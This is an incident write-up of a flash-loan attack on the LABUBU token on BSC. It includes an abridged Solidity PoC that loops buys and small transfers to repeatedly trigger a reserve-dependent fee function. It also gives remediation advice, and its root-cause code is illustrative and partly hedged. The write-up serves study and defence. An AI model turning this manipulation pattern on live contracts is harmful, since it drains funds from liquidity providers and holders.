# LABUBU — Transfer Fee Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-12-11 |
| **Protocol** | LABUBU Token |
| **Chain** | BSC |
| **Loss** | ~12,048 USD (17.4 BNB) |
| **Attacker** | [0x27441c62](https://bscscan.com/address/0x27441c62dbe261fdf5e1feec7ed19cf6820d583b) |
| **Attack Tx** | [0xb06df371](https://bscscan.com/tx/0xb06df371029456f2bf2d2edb732d1f3c8292d4271d362390961fdcc63a2382de) |
| **Vulnerable Contract** | [0x2ff960f1](https://bscscan.com/address/0x2ff960f1d9af1a6368c2866f79080c1e0b253997) |
| **Root Cause** | The LABUBU token's `BuyOrSell()` function is automatically invoked on every transfer and relies on AMM reserve-based pricing, allowing price manipulation; repeated transfers within a single transaction enable profitable arbitrage |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-12/LABUBU_exp.sol) |

---
## 1. Vulnerability Overview

The LABUBU token calls the internal `BuyOrSell()` function inside `_transfer()` to handle buy/sell fees. This fee calculation or processing logic either depended on the AMM reserve state or could be manipulated through repeated calls. The attacker borrowed WBNB via a PancakeV3 flash loan, then purchased LABUBU tokens 16 times and performed 15 small-value transfers per purchase, exploiting the fee mechanism repeatedly to accumulate profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ LABUBU Token: BuyOrSell() called from _transfer — manipulable
contract LABUBUToken {
    function _transfer(address from, address to, uint256 amount) internal {
        // ❌ BuyOrSell() called on transfer
        if (isPair[from] || isPair[to]) {
            BuyOrSell(from, to, amount);  // ❌ AMM state dependent
        }
        super._transfer(from, to, adjustedAmount);
    }

    function BuyOrSell(address from, address to, uint256 amount) internal {
        // ❌ Fee calculation based on LP reserves
        // ❌ Repeated calls accumulate fees or distort price
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 fee = amount * r0 / r1 / 100;  // manipulable
        // fee processing logic
    }
}

// ✅ Fix:
// Use fixed rate for fee calculation (remove oracle dependency)
// Prevent repeated calls within a single transaction
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: LABUBU_decompiled.sol
contract LABUBU {
    function transfer(address p0, uint256 p1) external {}  // ❌ vulnerable
```

## 3. Attack Flow

```
Attacker (0x27441c62)
  │
  ├─[1]─▶ Deploy AttackerC
  │
  ├─[2]─▶ PancakeV3Pool.flash() — WBNB flash loan
  │
  ├─[3]─▶ pancakeV3FlashCallback:
  │         └─ Outer loop × 16:
  │             Buy LABUBU with WBNB (triggers BuyOrSell)
  │             Inner loop × 15:
  │                 Small LABUBU transfer (repeatedly triggers BuyOrSell)
  │                 Fee mechanism manipulated repeatedly
  │         → Profit accumulated via manipulated fees/price
  │
  ├─[4]─▶ Sell LABUBU → WBNB
  │
  ├─[5]─▶ Convert WBNB → BNB, repay flash loan with fee
  │
  └─[6]─▶ ~17.4 BNB net profit
```

## 4. PoC Code

```solidity
function pancakeV3FlashCallback(...) external {
    // ❌ 16 * 15 = 240 BuyOrSell triggers
    for (uint256 i = 0; i < 16; i++) {
        // Buy LABUBU with WBNB
        router.swapTokensForExactTokens(1_300_000 ether, maxIn, path_WBNB_LABUBU, this, deadline);

        for (uint256 j = 0; j < 15; j++) {
            uint256 amount = 100_000 ether;
            // Small LABUBU transfer → repeated BuyOrSell() calls
            IERC20(LABUBU).transfer(VOVO, amount);  // ← triggers fee mechanism
        }
    }

    // Sell LABUBU → WBNB
    router.swapExactTokensForTokens(labubuBalance, 0, path_LABUBU_WBNB, this, deadline);

    // Repay flash loan
    IERC20(wBNB).transfer(PancakeV3Pool, repayAmount);
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Vulnerability |
| **Attack Vector** | Flash loan + repeated manipulation of transfer fee function |
| **CWE** | CWE-799: Improper Control of Interaction Frequency |
| **DASP** | Business Logic Vulnerability |
| **Severity** | Medium |

## 6. Remediation Recommendations

1. **Fix the fee rate**: Change the fee calculation in `BuyOrSell()` to use a fixed percentage
2. **Prevent repeated calls**: Block a single address from calling `BuyOrSell` more than N times within a single block
3. **Remove AMM dependency**: Do not use real-time reserves for fee calculation
4. **Simplify transfer logic**: Remove complex logic from `_transfer`

## 7. Lessons Learned

- Complex logic inside `_transfer()` (such as `BuyOrSell` and fee calculations) becomes a target for repeated-call attacks.
- The combination of a flash loan and repeated transfers can compound small per-call profits hundreds of times into significant losses.
- Token transfer functions should be simple; complex business logic should be separated into dedicated contracts.